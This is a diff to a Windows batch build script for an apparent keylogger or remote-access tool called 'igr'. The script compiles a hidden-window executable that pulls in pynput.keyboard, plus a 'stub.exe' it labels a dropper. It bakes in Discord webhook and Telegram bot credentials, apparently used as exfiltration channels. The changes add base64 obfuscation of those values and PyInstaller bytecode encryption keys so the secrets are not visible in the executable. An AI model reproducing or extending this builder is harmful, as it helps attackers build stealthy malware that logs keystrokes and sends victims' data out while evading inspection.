@@ -72,12 +72,21 @@ echo   Config ready.
 
 REM Create build copy of main.py with injected values
 echo.
-echo [2/6] Injecting configuration...
+echo [2/6] Injecting configuration (encrypted)...
 copy /y "main.py" "main_build.py" >nul
 
-powershell -Command "(Get-Content 'main_build.py' -Raw) -replace 'BUILD_DISCORD_WEBHOOK', '%DISCORD_WEBHOOK%' -replace 'BUILD_DISCORD_USERNAME', '%DISCORD_USERNAME%' -replace 'BUILD_DASHBOARD_PASSWORD', '%DASHBOARD_PASSWORD%' -replace 'BUILD_TELEGRAM_BOT_TOKEN', '%TELEGRAM_BOT_TOKEN%' -replace 'BUILD_TELEGRAM_CHAT_ID', '%TELEGRAM_CHAT_ID%' -replace 'BUILD_UPDATE_URL', '%UPDATE_URL%' | Set-Content 'main_build.py' -NoNewline"
+REM Base64-encode sensitive values so they are not plaintext in the exe
+powershell -Command ^
+    "$dw=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%DISCORD_WEBHOOK%')); ^
+     $du=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%DISCORD_USERNAME%')); ^
+     $dp=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%DASHBOARD_PASSWORD%')); ^
+     $tt=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%TELEGRAM_BOT_TOKEN%')); ^
+     $tc=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%TELEGRAM_CHAT_ID%')); ^
+     $uu=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%UPDATE_URL%')); ^
+     $ek=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('igr_enc_key_2024')); ^
+     (Get-Content 'main_build.py' -Raw) -replace 'BUILD_DISCORD_WEBHOOK', ('ENC:'+^$dw) -replace 'BUILD_DISCORD_USERNAME', ('ENC:'+^$du) -replace 'BUILD_DASHBOARD_PASSWORD', ('ENC:'+^$dp) -replace 'BUILD_TELEGRAM_BOT_TOKEN', ('ENC:'+^$tt) -replace 'BUILD_TELEGRAM_CHAT_ID', ('ENC:'+^$tc) -replace 'BUILD_UPDATE_URL', ('ENC:'+^$uu) -replace 'BUILD_ENCRYPTION_KEY', ('ENC:'+^$ek) | Set-Content 'main_build.py' -NoNewline"
 
-echo   Values injected.
+echo   Values encrypted and injected.
 
 echo.
 echo [3/6] Installing dependencies...
@@ -101,6 +110,7 @@ if not exist cloudflared.exe (
 echo.
 echo [5/6] Compiling igr_v%IGR_VERSION%.exe...
 python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% %ICON_FLAG% --clean --noconfirm ^
+    --key=igr_pyc_key_2024 ^
     --hidden-import flask ^
     --hidden-import requests ^
     --hidden-import pynput.keyboard ^
@@ -272,12 +282,21 @@ echo   Config ready.
 
 REM Inject config into main.py
 echo.
-echo [2/7] Injecting configuration...
+echo [2/7] Injecting configuration (encrypted)...
 copy /y "main.py" "main_build.py" >nul
 
-powershell -Command "(Get-Content 'main_build.py' -Raw) -replace 'BUILD_DISCORD_WEBHOOK', '%DISCORD_WEBHOOK%' -replace 'BUILD_DISCORD_USERNAME', '%DISCORD_USERNAME%' -replace 'BUILD_DASHBOARD_PASSWORD', '%DASHBOARD_PASSWORD%' -replace 'BUILD_TELEGRAM_BOT_TOKEN', '%TELEGRAM_BOT_TOKEN%' -replace 'BUILD_TELEGRAM_CHAT_ID', '%TELEGRAM_CHAT_ID%' -replace 'BUILD_UPDATE_URL', '%UPDATE_URL%' | Set-Content 'main_build.py' -NoNewline"
+REM Base64-encode sensitive values so they are not plaintext in the exe
+powershell -Command ^
+    "$dw=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%DISCORD_WEBHOOK%')); ^
+     $du=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%DISCORD_USERNAME%')); ^
+     $dp=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%DASHBOARD_PASSWORD%')); ^
+     $tt=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%TELEGRAM_BOT_TOKEN%')); ^
+     $tc=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%TELEGRAM_CHAT_ID%')); ^
+     $uu=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%UPDATE_URL%')); ^
+     $ek=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('igr_enc_key_2024')); ^
+     (Get-Content 'main_build.py' -Raw) -replace 'BUILD_DISCORD_WEBHOOK', ('ENC:'+^$dw) -replace 'BUILD_DISCORD_USERNAME', ('ENC:'+^$du) -replace 'BUILD_DASHBOARD_PASSWORD', ('ENC:'+^$dp) -replace 'BUILD_TELEGRAM_BOT_TOKEN', ('ENC:'+^$tt) -replace 'BUILD_TELEGRAM_CHAT_ID', ('ENC:'+^$tc) -replace 'BUILD_UPDATE_URL', ('ENC:'+^$uu) -replace 'BUILD_ENCRYPTION_KEY', ('ENC:'+^$ek) | Set-Content 'main_build.py' -NoNewline"
 
-echo   Values injected.
+echo   Values encrypted and injected.
 
 REM Install dependencies
 echo.
@@ -289,6 +308,7 @@ REM Compile IGR exe
 echo.
 echo [4/7] Compiling igr_v%IGR_VERSION%.exe...
 python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% %ICON_FLAG% --clean --noconfirm ^
+    --key=igr_pyc_key_2024 ^
     --hidden-import flask ^
     --hidden-import requests ^
     --hidden-import pynput.keyboard ^
@@ -317,6 +337,7 @@ REM Compile stub dropper
 echo.
 echo [5/7] Compiling stub.exe (dropper)...
 python -m PyInstaller --onefile --noconsole --name stub %ICON_FLAG% --clean --noconfirm ^
+    --key=igr_pyc_key_2024 ^
     stub.py
 
 if not exist "dist\stub.exe" (
